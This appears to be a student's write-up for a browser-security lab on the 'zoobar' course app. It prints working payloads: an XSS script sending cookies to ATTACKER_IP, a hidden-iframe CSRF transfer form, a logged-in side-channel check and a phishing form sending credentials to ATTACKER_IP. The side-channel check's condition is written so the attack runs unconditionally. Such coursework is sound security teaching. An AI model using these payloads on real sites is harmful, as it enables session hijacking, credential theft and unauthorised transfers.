##Browser security

###Exercise 1: Cookie Theft

The payload for the exercise consists from several parts:

    <script>
    document.addEventListener("DOMContentLoaded", theDomHasLoaded, false); //Wait that DOM has loaded in the page so we modify the warning text message class
    function theDomHasLoaded(e) { 
    document.getElementsByClassName("warning")[0].style.visibility = 'hidden'; // this hides the red warning message from the page
    } 
    new Image().src = 'http://ATTACKER_IP/?cookie=' + encodeURIComponent(document.cookie); //this is the payload to steal the victims cookie
    </script>

The payload also requires that we include ""> in the beginning of the payload and </ at the end so that the exploit works properly and hides any extraneous text from the page that would tip the victim about on ongoing attack.

    ""><script>document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);function theDomHasLoaded(e) { document.getElementsByClassName("warning")[0].style.visibility = 'hidden';} new Image().src = 'http://ATTACKER_IP/?cookie=' + encodeURIComponent(document.cookie);</script></
    
Finally, the payload needs to be URL encoded. The attack URL can be found from the following file: [answer-1.txt] (https://github.com/ukk1/ITKST53/blob/master/Lab5/answer-1.txt)

###Exercise 2: Cross-Site Request Forgery

Below is provided the HTML and JavaScript code for the CSRF attack that will transfer 10 zoobars from the victim to the user 'attacker' and redirect the victim to other site.

    <html>
    <body>
        <form name="csrf" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="iframe">
            <input type="hidden" name="zoobars" value="10" />
            <input type="hidden" name="recipient" value="attacker" />
        </form>
        <iframe style="display:none" id="iframe" name="iframe" frameborder="0"></iframe>
        <script> 
            document.getElementById("iframe").onload = function() {
                window.location.href = "http://css.csail.mit.edu/6.858/2014/";
            }
            document.forms[0].submit();
        </script>
    </body>
    </html>

###Exercise 3: Side Channels and Phishing

In this exercise we can retrieve the information from the zoobarjs file to see if the user is logged in or not. If user is logged in the file will include information about how many zoobars the user has. We can use this information in conjunction with JavaScript to check if the user, who visits the attackers site is logged in, since we can check if the file returns the amount of zoobars.

    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
    <script> 
    //if user is logged in transfer users zoobar to the attackers account
        var zoobars = myZoobars;
        if (zoobars || true); {
        location.href = "answer-2.html"; //launch the CSRF attack if user is logged in
        }
    </script>

The answer-2.html file must be located in the same folder as the answer-3.html file so that the CSRF attack works as expected.

For intercepting the users credentials following modifications were done to the form HTML code, also some new JavaScript was added:

    <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="intercept()">
    
    <script>
        function intercept() {
		var username = document.forms[0].elements[0].value;
		var password = document.forms[0].elements[1].value;
		new Image().src = "http://ATTACKER_IP:8888/?username="+username+"&password="+password;
	}
	</script>
	
When the user enters his or her credentials, they will be sent to the attacker and user will be logged in normally.

###Exercise 4: Profile Worm

We completed this exercise with the XMLHttpRequest approach. Full working version can be found by following this link [answer-4.txt] (https://github.com/ukk1/ITKST53/blob/master/Lab5/answer-4.txt)
